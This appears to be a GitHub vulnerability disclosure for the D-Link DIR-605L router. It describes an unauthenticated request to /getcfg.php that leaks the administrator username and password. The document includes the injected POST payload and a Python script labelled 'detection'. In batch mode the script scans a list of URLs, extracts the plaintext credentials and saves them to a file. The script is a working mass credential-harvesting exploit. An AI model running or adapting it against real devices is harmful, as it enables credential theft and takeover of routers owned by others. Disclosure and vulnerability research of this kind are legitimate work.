# D-LINK-DIR-605L 

## Sensitive information disclosure vulnerability in D-Link dir-605 Hardware Version : B2 Firmware Version : 2.01MT

Sensitive information disclosure vulnerability exists in D-Link dir-605 Hardware Version : B2 Firmware Version : 2.01MT. An attacker can obtain a user name and password by forging a post request to the / getcfg.php page


## harm

An attacker can access this page without authorization, obtain the user name and password in plaintext, and obtain background management privileges after logging in to the background


## Test method
1. Visit the d-link-dir-605L background login page

![image](https://user-images.githubusercontent.com/90023952/131968944-a5cc3503-d2b9-4394-9a6b-7aaf6b7fdce9.png)

2. Enter any password, then grab the packet and modify the packet content as follows

![image](https://user-images.githubusercontent.com/90023952/131959930-bdc051b1-e234-4803-972d-adf58ddeb554.png)

![image](https://user-images.githubusercontent.com/90023952/131959858-ace71dc7-41c0-4f25-852d-ecc01f2016fd.png)

3.Use the obtained user name and password to successfully log in to the background

![image](https://user-images.githubusercontent.com/90023952/131968995-dc5eee6b-049f-4144-8d3d-a2f8acfe9099.png)

## Script automation detection

```
import requests
import argparse
import re
import urllib3
urllib3.disable_warnings()
parser = argparse.ArgumentParser(description='api help')
parser.add_argument('-u','--url', help='Please Input a url!',default='')
parser.add_argument('-r','--read', help='Please Input a file!',default='')
args=parser.parse_args()
url=args.url
file=args.read

if url !="":
    url=url+"/getcfg.php"
    header={
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
    "Content-Type":"application/x-www-form-urlencoded",
    "Cookie":"",
    "X-Forwarded-For":"127.0.0.1"
            }
    data = ("SERVICES=DEVICE.ACCOUNT&AUTHORIZED_GROUP=1%0a")
    response=requests.post(url,data=data,headers=header,verify=False,timeout=10)
    print(response.text)
    if  "DEVICE.ACCOUNT" in response.text and response.status_code == 200:
        print("[" + url + "]" + "[===dangerous===]")
    else:
        print("["+url+"]"+"[safe]")

if file !="":
    txt=file
    f=open(txt,'r+')
    for i in f.readlines():
        url=i.strip()
        url=url+"/getcfg.php"
        header={
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
        "Content-Type":"application/x-www-form-urlencoded",
        "Cookie":"",
        "X-Forwarded-For": "127.0.0.1"
        }
        data = ("SERVICES=DEVICE.ACCOUNT&AUTHORIZED_GROUP=1%0a")
        try:
            response=requests.post(url,data=data,headers=header,verify=False,timeout=10)
            if "DEVICE.ACCOUNT" in response.text and response.status_code == 200:
                name = re.findall('<name>.*', response.text)
                password = re.findall('<password>.*', response.text)
                print("[" + url + "]" + "[===dangerous===]")
                w = open("DIR-605-Vulnerability-file.txt", "a")
                w.write(url + '\r\n' + repr(name) + repr(password) + '\r\n')
            else:
                print("[" + url + "]" + "[safe]")
        except Exception as e:
            print("["+url+"]"+"[safe]",format(e))


```
1. Detect a single URL

python D-LINK-DIR-605.py -u http://xxx.xxx.xxx.xxx

![image](https://user-images.githubusercontent.com/90023952/131969274-a2d83a61-02b6-4bbf-af98-d74d71336117.png)

2. Batch inspection

python D-LINK-DIR-605.py -r file.txt

![image](https://user-images.githubusercontent.com/90023952/131969509-897cdfa0-25e4-4f5f-8b68-3c99b3deb6d1.png)

After the batch detection script is executed, a file named "dir-605-vulnerability-file. TXT" will be generated in the current folder, with the contents of vulnerability URL and explored user name and password

![image](https://user-images.githubusercontent.com/90023952/131969548-98b17445-98c1-4ce1-8b0a-284ed2430259.png)

![image](https://user-images.githubusercontent.com/90023952/131969592-f7bc2332-458d-4476-be90-9ac6e5e72ac2.png)





